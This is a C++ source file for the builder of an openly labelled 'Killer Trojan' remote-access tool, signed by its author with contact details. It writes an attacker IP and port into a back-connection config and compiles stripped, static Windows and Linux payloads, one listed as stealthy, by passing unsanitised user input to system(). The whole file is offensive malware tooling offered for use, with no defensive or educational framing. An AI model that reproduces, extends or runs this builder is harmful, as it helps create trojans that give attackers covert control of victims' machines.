/**
[+] Author : ABDO10
[+] Date : Aprl , 2020 
[+] # 1.1 r 1 BY ABDO10 , Killer Trojan
  
**/
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <cstdlib>
using namespace std ;

    void Help(){
    
    cerr << " Usage: " << endl;
	cerr << " [OPTIONS]                                              +>        [OPTIONS OUTPUT] " << endl;  
	cerr << " -c/--config <IP Address> <PORT>                        +>        set config for the back connection" << endl;
	cerr << " -b/--build <system> <type number> <payloadname>        +>        use lising option if u missing them ( system is linux or windows)" << endl; 
	cerr << " -l/--list                                              +>        Listing payloads " << endl;
	cerr << " -h/--help                                              +>        Show this help menu " << endl;
	cerr << "\n [+] E.g +> " << "sudo killer" << " -b windows 1 /home/user/Desktop/payload.exe" << endl;
	cerr << " \n " << endl;
    
    } 

	int main(int argc , char *argv[]){
	
	cout << "\n\n\n \t \t \t \t Killer Builder » 1.1 r 1  \n \n" << endl;

	cout << " +> Programmer +> ABDO10 " << endl;
        cout << " +> Greetz +> mathio_dz , Dzx , Milworm_Dz , My PC " << endl;
	cout << " +> Tool +> Killer Trojan" << endl;
	cout << " +> Initial Release +> 1.0 r 0" << endl;
	cout << " +> Previous Release +> 1.1 r 0 " << endl;
	cout << " +> Stable Release +> 1.1 r 1 " << endl;
	cout << " +> Contact -> Telegram: https://t.me/abdo10hacker" << endl;   
        cout << "            -> ICQ: 745267487 " << endl;
        cout << "            -> Email: defacerdz@gmail.com\n" << endl;

	//logo
	cout << endl;
	cout << "\t \t \t  ____. __ __.__  .__                " << endl;
	cout << "\t \t \t /    |/ _|__|  | |  |   ___________ " << endl;
	cout << "\t \t \t |      < |  |  | |  | _/ __ \\_  __ \\" << endl;
	cout << "\t \t \t |    |  \\|  |  |_|  |_\\  ___/|  | \\/" << endl;
	cout << "\t \t \t |____|__ \\__|____/____/\\___  >__|   " << endl;
	cout << "\t \t \t         \\/                 \\/       " << endl;
	cout << endl;

     
    int value = argc;
	if (value < 2 ) {
      Help(); 
	  return 6;	
	}
	
         
     string option = argv[1];
        
    if (option == "-l" || option == "--list" ){
	
	cout << "[Payload]                            [Stealth]             [Extension]            [System]           [Type]" << endl; 
	cout << "Windows Executable Payload           No                    .exe                   Windows            1 " <<endl;
	cout << "Linux Executable Payload             Yes                   .elf                   Linux              1" << endl; 
	cout << "Linux Executable Payload             No                    shell                  Linux              2" << endl; 
	cout << "\n" << endl << endl; 
	}
        
             
	else if (option == "-c" || option == "--config" ) {
	    if (value < 4 ) {
	    Help();
	    return 5;
        }
	string address = argv[2];
	string port = argv[3];
    string path = "src/config.h";
    ofstream set_config ;
	
	cout << " [*] Saving Info... " << endl;

	set_config.open(path); 
	if (set_config.fail()){
	cerr  << " [-] Something Error Detected , Please Re-Install Me! " << endl;
	return 4; 

	} 
	else {
	
	set_config << "	// NO-IP Dns Or IP Address Below:" << endl;  
	set_config << "	char host_address[99999] = {\""<< address << "\"};"<<  endl ; 
	set_config << "	// TCP PORT Below:" << endl; 
        set_config << "	static int PORT = " << port << " ; " << endl;  
	cout << " [+] Config Has Been Saved!" << endl;
	}
	
	} 
	else if  (option == "-b"  || option == "--build" ){
	
        if (value < 5 ) {
        Help();
        return 3;
        } 
	string os_type = argv[2];
	string payload_type = argv[3];
    string payload_name = argv[4];
    
	if (os_type == "windows"){
	
	string windows_build = "i686-w64-mingw32-g++ src/windows_payload.cpp -o " + payload_name + " -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc";

	// compiling windows payload to binaries
    cout << " [*] generating Payload ..." << endl;   
	system((windows_build).c_str());
	cout << " [+] Successful to write Windows payload (default payload) => "<< payload_name << endl;
	
	}
	
	else if (os_type == "linux"){
	// compiling linux payload to binaries
	string linux_build ; 
	    if (payload_type  == "1"){
	     
	     linux_build = "g++ -static -O3 -lpthread -pthread src/linux_payload.cpp -o "+ payload_name;
	     }
	      else if (payload_type == "2"){
	      linux_build = "g++ src/linux_payload.cpp -o " + payload_name;
	      }
	       else {
	        cerr << " [-] Error: payload type , use -l/--list to listing payloads' types or -h/--help to show help menu." << endl;
	         return 2;
	       }
	cout << " [*] generating Payload ..." << endl;  
	system((linux_build).c_str());       
	cout << " [+] Successful to write Linux payload (Type "<< payload_type << ") => "<< payload_name << endl;
	
	}
	else {
	cerr << " [-] invalid OS : " << os_type << endl; 
	} 
	
	
	}

	else {
        Help();
        return 1;
	}
	
	return 0;

	}

